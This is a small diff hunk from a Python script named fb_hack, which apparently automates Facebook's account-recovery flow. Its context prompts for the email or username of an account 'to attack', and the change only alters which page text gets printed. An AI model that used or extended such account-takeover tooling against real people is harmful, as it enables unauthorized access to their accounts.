@@ -123,7 +123,7 @@ def fb_hack(email, codex):
   response1 = browser.response()
   soup = BeautifulSoup(response1, 'html.parser')
   xx = soup.find(id='n')
-  print(xx)
+  print(soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long."))
 
 os.system('clear')
 ehack = input('Email address or username to attack:')
